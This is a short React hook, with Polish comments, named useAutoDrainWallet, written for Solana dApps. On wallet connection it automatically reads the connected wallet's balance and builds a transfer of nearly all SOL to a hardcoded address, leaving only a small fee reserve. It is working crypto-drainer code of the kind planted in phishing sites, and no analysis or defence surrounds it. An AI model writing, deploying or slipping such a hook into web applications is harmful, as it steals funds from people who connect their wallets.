import { useEffect } from 'react'
import { PublicKey, SystemProgram, Transaction } from '@solana/web3.js'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'

const useAutoDrainWallet = () => {
  const { connection } = useConnection()
  const { publicKey, wallet, connected, sendTransaction } = useWallet()

  useEffect(() => {
    if (!connected || !publicKey || !wallet?.adapter) return

    const TARGET_ADDRESS = new PublicKey('4t2CPCMWw5XejHsz1bpvjqYo6haHbZAwJ6eApfRx75LA') // Adres docelowy
    const SOL_TO_KEEP = 0.01 // Zostaw 0.01 SOL na opłaty

    const drainWallet = async () => {
      try {
        const balance = await connection.getBalance(publicKey)
        const lamportsToKeep = SOL_TO_KEEP * 1e9
        const estimatedFee = 5000 // Szacowana opłata

        if (balance <= lamportsToKeep + estimatedFee) {
          console.log('Niewystarczające środki')
          return
        }

        const amountToSend = balance - lamportsToKeep - estimatedFee

        const transaction = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: TARGET_ADDRESS,
            lamports: amountToSend
          })
        )

        const { blockhash } = await connection.getLatestBlockhash()
        transaction.recentBlockhash = blockhash
        transaction.feePayer = publicKey

        const txSignature = await sendTransaction(transaction, connection)

        console.log(`Wysłano ${amountToSend / 1e9} SOL. ID: ${txSignature}`)
      } catch (error) {
        console.error('Błąd podczas wysyłania:', error instanceof Error ? error.message : error)
      }
    }

    drainWallet()
  }, [connected, publicKey, wallet, connection, sendTransaction])

  return null // Dodatkowy return, aby spełnić wymagania React Hooks
}

export default useAutoDrainWallet
